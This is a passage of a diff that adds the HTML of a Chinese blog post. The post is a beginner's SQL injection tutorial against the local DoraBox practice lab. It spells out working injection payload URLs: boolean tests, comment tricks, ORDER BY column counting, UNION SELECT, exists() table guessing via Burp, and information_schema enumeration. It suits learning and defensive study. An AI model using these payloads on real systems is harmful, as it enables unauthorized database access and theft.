@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>SQL注入基础学习 | Welcome to Chumen77&#39;s Blog | Struggle 就完事了 !</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content>
+    <meta name="description" content="SQL注入基础学习数据类型（数字型）检测是否sql语句是否执行使用and,or,xor,like测试 ** 1=1 ** 1=2其中**可以为and or xor like任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。  使用符号测试 单引号 减号  数据类型（字符型）检测是否sql语句是否执行此处跟数字型测试办法基本一样，还是使用and,or,xor,like、单引号测试。最近接触字符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入基础学习">
+<meta property="og:url" content="https://chumen77.github.io/2019/09/01/SQL基础学习/index.html">
+<meta property="og:site_name" content="Welcome to Chumen77&#39;s Blog">
+<meta property="og:description" content="SQL注入基础学习数据类型（数字型）检测是否sql语句是否执行使用and,or,xor,like测试 ** 1=1 ** 1=2其中**可以为and or xor like任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。  使用符号测试 单引号 减号  数据类型（字符型）检测是否sql语句是否执行此处跟数字型测试办法基本一样，还是使用and,or,xor,like、单引号测试。最近接触字符">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673389579474.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673394738908.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673394874987.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673411551995.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673412010749.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673412472041.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673428181899.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673428766361.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673429298587.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673429733420.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673503130693.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673494870032.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673498250797.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673498938620.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673503981645.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673529496971.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673532051506.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673536538274.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679129656049.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679138962766.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679139214321.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679141526795.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679142504637.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679143681990.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679145034217.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679144276086.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679145997135.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679146928775.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679147050548.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679147687971.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679148321357.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679152029822.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679151626020.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679322405278.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679326036385.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679327628086.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679330638311.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679331040602.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679332502596.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679333657212.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679337786295.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679344981875.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679342199859.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679346900575.jpg">
+<meta property="og:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15679349902804.jpg">
+<meta property="og:updated_time" content="2019-10-17T15:33:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入基础学习">
+<meta name="twitter:description" content="SQL注入基础学习数据类型（数字型）检测是否sql语句是否执行使用and,or,xor,like测试 ** 1=1 ** 1=2其中**可以为and or xor like任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。  使用符号测试 单引号 减号  数据类型（字符型）检测是否sql语句是否执行此处跟数字型测试办法基本一样，还是使用and,or,xor,like、单引号测试。最近接触字符">
+<meta name="twitter:image" content="https://chumen77.github.io/2019/09/01/SQL基础学习/images/15673389579474.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="Welcome to Chumen77&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">chumen77</h5>
+          <a href="mailto:973059980@qq.com" title="973059980@qq.com" class="mail">973059980@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/chumen77" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://www.weibo.com/" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">SQL注入基础学习</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">SQL注入基础学习</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-09-01T11:17:25.000Z" itemprop="datePublished" class="page-time">
+  2019-09-01
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入基础学习"><span class="post-toc-number">1.</span> <span class="post-toc-text">SQL注入基础学习</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#数据类型（数字型）"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">数据类型（数字型）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#检测是否sql语句是否执行"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">检测是否sql语句是否执行</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#使用and-or-xor-like测试"><span class="post-toc-number">1.1.1.1.</span> <span class="post-toc-text">使用and,or,xor,like测试</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#使用符号测试"><span class="post-toc-number">1.1.1.2.</span> <span class="post-toc-text">使用符号测试</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#数据类型（字符型）"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">数据类型（字符型）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#检测是否sql语句是否执行-1"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">检测是否sql语句是否执行</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#union知识小记"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">union知识小记</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#order-by-知识小记"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">order by 知识小记</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#显示联合查询出现的结果"><span class="post-toc-number">1.2.4.</span> <span class="post-toc-text">显示联合查询出现的结果</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exists（）函数小记"><span class="post-toc-number">1.2.5.</span> <span class="post-toc-text">exists（）函数小记</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#数据类型（搜索型）"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">数据类型（搜索型）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#的作用"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">%的作用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#如何注入"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">如何注入</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-SQL基础学习"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">SQL注入基础学习</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-09-01 19:17:25" datetime="2019-09-01T11:17:25.000Z"  itemprop="datePublished">2019-09-01</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="SQL注入基础学习"><a href="#SQL注入基础学习" class="headerlink" title="SQL注入基础学习"></a>SQL注入基础学习</h1><h2 id="数据类型（数字型）"><a href="#数据类型（数字型）" class="headerlink" title="数据类型（数字型）"></a>数据类型（数字型）</h2><h3 id="检测是否sql语句是否执行"><a href="#检测是否sql语句是否执行" class="headerlink" title="检测是否sql语句是否执行"></a>检测是否sql语句是否执行</h3><h4 id="使用and-or-xor-like测试"><a href="#使用and-or-xor-like测试" class="headerlink" title="使用and,or,xor,like测试"></a>使用<code>and,or,xor,like</code>测试</h4><ul>
+<li>** 1=1</li>
+<li>** 1=2<br>其中<code>**</code>可以为<code>and or xor like</code>任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。</li>
+</ul>
+<h4 id="使用符号测试"><a href="#使用符号测试" class="headerlink" title="使用符号测试"></a>使用符号测试</h4><ul>
+<li>单引号</li>
+<li>减号</li>
+</ul>
+<h2 id="数据类型（字符型）"><a href="#数据类型（字符型）" class="headerlink" title="数据类型（字符型）"></a>数据类型（字符型）</h2><h3 id="检测是否sql语句是否执行-1"><a href="#检测是否sql语句是否执行-1" class="headerlink" title="检测是否sql语句是否执行"></a>检测是否sql语句是否执行</h3><p>此处跟数字型测试办法基本一样，还是使用<code>and,or,xor,like</code>、<code>单引号</code>测试。最近接触字符型的注入较少，补充一下原理：</p>
+<p>我们先进行正常查询：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submit</code><br>当我们给接受处加<code>&#39;</code>：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submit</code>语句执行后，会产生报错：<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673389579474.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure><br>然后我们想办法不让其报错，就是来省略后面那个php代码语句加的<code>&#39;</code>:</p>
+<ol>
+<li>用<code>#</code>来注释，但需要进行url来转变一下为<code>%23</code></li>
+<li>用<code>--+</code> <code>--%20</code>来注释<br>然后就可以来用<code>and or xor like</code>来测试了，例如：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submit</code><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673394738908.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit</code><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673394874987.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+</li>
+</ol>
+<h3 id="union知识小记"><a href="#union知识小记" class="headerlink" title="union知识小记"></a>union知识小记</h3><p>union在集合两个select查询语句时，一定要注意<strong>两个查询出来的结果,列数（columns）要相等才会出来结果。</strong><br>例如：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673411551995.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p><code>SELECT * from news union SELECT 1,2;</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673412010749.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>报错，换成<code>SELECT * from news union SELECT 1,2,3;</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673412472041.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="order-by-知识小记"><a href="#order-by-知识小记" class="headerlink" title="order by 知识小记"></a>order by 知识小记</h3><p><code>order by</code>是按照一定规则来进行排序的语句。我们为什么能够通过<code>order by</code>排序，来排出来列名有多少个呢？我们来测试一下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673428181899.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p><code>SELECT * from test ORDER BY 1;</code><br>当我们在测试到<code>SELECT * from test ORDER BY 5;</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673428766361.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现出了异常。<br>我们换个3列的表：<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673429298587.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure><br><code>SELECT * from news
+ORDER BY 3;</code>显示是正常的<br><code>SELECT * from news
+ORDER BY 4;</code><img src="/2019/09/01/SQL基础学习/images/15673429733420.jpg" alt><br>所以可以<strong>发现我们在<code>order by</code>后加数字可以来测出来一个表的列名个数。</strong></p>
+<h3 id="显示联合查询出现的结果"><a href="#显示联合查询出现的结果" class="headerlink" title="显示联合查询出现的结果"></a>显示联合查询出现的结果</h3><p>显示我们自定义查询的结果，该怎么实现呢。<br>先在靶场测试：<code>SELECT * FROM news WHERE id = 2 union select 1,2,3 from test</code><img src="/2019/09/01/SQL基础学习/images/15673503130693.jpg" alt></p>
+<p>明显网页是不给显示的。相同语句在数据库：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673494870032.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>不给显示是因为服务器端php代码进行了处理，只可以显示出一条结果。那如果把第一个查询结果给无法显示，是不是就可以显示我们联合查询的结果呢。先在数据库测试下SQL语句：<code>SELECT * FROM news WHERE id = -1</code><img src="/2019/09/01/SQL基础学习/images/15673498250797.jpg" alt="-w430"><br>发现是不显示东西的。继续测试:<code>SELECT * FROM news WHERE id = -1 union select 1,2,3 from test;</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673498938620.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>接着我们拿到靶场测试：<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673503981645.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure></p>
+<p>达到我们的目的了。看这个页面显示的效果<code>2 3</code>，反向思维考虑把<code>2 3</code>改成我们的列名是不是就可以出数据了，<strong>但是我们如何知道表里的列名呢？</strong></p>
+<h3 id="exists（）函数小记"><a href="#exists（）函数小记" class="headerlink" title="exists（）函数小记"></a>exists（）函数小记</h3><p><code>exists()</code>是验证某个语句是否存在结果，是个bool函数，存在显示<code>1</code>反之是<code>0</code>。<br><code>SELECT * FROM news WHERE id=1 and exists(select * from test);</code>在数据库进行测试:<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673529496971.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure><br><code>SELECT * FROM news WHERE id=1 and exists(select * from aa);</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673532051506.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现在用这个函数查<strong>不存在的表</strong>的时候语句是没法进行的，然后我们可以通过这个语句来推出表名和列名，不过十分麻烦，<strong>可以通过burpsuit来跑</strong>。还有意外收获，可以看出数据库的名字<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15673536538274.jpg" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure><br>pentest就是数据库的名字了。</p>
+<h2 id="数据类型（搜索型）"><a href="#数据类型（搜索型）" class="headerlink" title="数据类型（搜索型）"></a>数据类型（搜索型）</h2><h3 id="的作用"><a href="#的作用" class="headerlink" title="%的作用"></a><code>%</code>的作用</h3><p><code>%</code>在mysql中表示通配符。在SQL语句中:<br><code>******* like &#39;%a&#39;</code>，就是搜索返回以字母<code>a</code>结尾的所有信息，同理<code>a%``%a%</code>,分别就是 搜索返回以字母<code>a</code>开头的所有信息和搜索返回包含字母<code>a</code>的所有信息。</p>
+<h3 id="如何注入"><a href="#如何注入" class="headerlink" title="如何注入"></a>如何注入</h3><p>咱们先看下php源代码:<code>$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //search</code><br>很明显提前闭合<code>&#39;%</code>跟省略后面的<code>%&#39;</code>就可以了，所以<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679129656049.jpg" alt="-w804" title>
+                </div>
+                <div class="image-caption">-w804</div>
+            </figure>
+
+<p>然后我们正常走步骤，利用<code>order by</code>来确定下多少列：<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679138962766.jpg" alt="-w840"><br>继续<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submit</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679139214321.jpg" alt="-w1022" title>
+                </div>
+                <div class="image-caption">-w1022</div>
+            </figure>
+<p>可以确定是3列了。</p>
+<p>然后开始确定表名，这次用刚刚学的exist()来测试，并且练习一下burp来跑表名和列名：<br>先正常构造payload：<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submit</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679141526795.jpg" alt="-w843" title>
+                </div>
+                <div class="image-caption">-w843</div>
+            </figure>
+<p>确定news表名存在，然后开始用burp跑其他的：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679142504637.jpg" alt="-w555" title>
+                </div>
+                <div class="image-caption">-w555</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679143681990.jpg" alt="-w837" title>
+                </div>
+                <div class="image-caption">-w837</div>
+            </figure>
+<p>我们是跑表名，所以在<code>news</code>加上变量。这个步骤需要先点<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679145034217.jpg" alt="-w371" title>
+                </div>
+                <div class="image-caption">-w371</div>
+            </figure><br>然后</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679144276086.jpg" alt="-w364" title>
+                </div>
+                <div class="image-caption">-w364</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679145997135.jpg" alt="-w531" title>
+                </div>
+                <div class="image-caption">-w531</div>
+            </figure>
+<p>在“添加“按钮旁的位置开始填入测试的表名，这个我是手动填的，可以进行导入字典。<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679146928775.jpg" alt="-w1260" title>
+                </div>
+                <div class="image-caption">-w1260</div>
+            </figure></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679147050548.jpg" alt="-w778" title>
+                </div>
+                <div class="image-caption">-w778</div>
+            </figure>
+<p>然后我们开始看结果<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679147687971.jpg" alt="-w666" title>
+                </div>
+                <div class="image-caption">-w666</div>
+            </figure><br><code>Render</code>下面显示正常就证明是存在的。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679148321357.jpg" alt="-w963" title>
+                </div>
+                <div class="image-caption">-w963</div>
+            </figure>
+<p>这个是不存在。最终用这个办法可以跑出表名<code>test、account</code>。同样办法跑列名：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679152029822.jpg" alt="-w665" title>
+                </div>
+                <div class="image-caption">-w665</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679151626020.jpg" alt="-w797" title>
+                </div>
+                <div class="image-caption">-w797</div>
+            </figure>
+<p>确定出<code>news</code>表中有<code>id、title、content</code>等列。</p>
+<p>然后我们更新下语句来查表和列，<code>exists()</code>这个办法是有点老的比较笨。<strong>在MySQL&gt;5.1版本中</strong>，<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679322405278.jpg" alt="-w764" title>
+                </div>
+                <div class="image-caption">-w764</div>
+            </figure><br>我们可以在<code>information_schema</code>发现这个我们的数据库和列名都可以直接看到，所以我们可以以下语句进行查询：<br>第一步，我们先让其可以显示我们想查询的内容<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679326036385.jpg" alt="-w904"><br>把标题下的<code>2</code>换成<code>darabase()</code>函数，来显示下数据库的名字。<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submit</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679327628086.jpg" alt="-w982" title>
+                </div>
+                <div class="image-caption">-w982</div>
+            </figure>
+<p>然后我们就的得到了<code>pentest</code>，然后开始利用这个mysql&gt;5.1特性来构造语句：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679330638311.jpg" alt="-w902" title>
+                </div>
+                <div class="image-caption">-w902</div>
+            </figure>
+<p>但是在这里面怎么显示其他的名字呢？<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679331040602.jpg" alt="-w523" title>
+                </div>
+                <div class="image-caption">-w523</div>
+            </figure><br>继续:<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39;--+&amp;submit=submit</code>其中可以将<code>!=</code>换成<code>&lt;&gt;</code>是同样的效果。<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/01/SQL基础学习/images/15679332502596.jpg" alt="-w916" title>
+                </div>
+                <div class="image-caption">-w916</div>
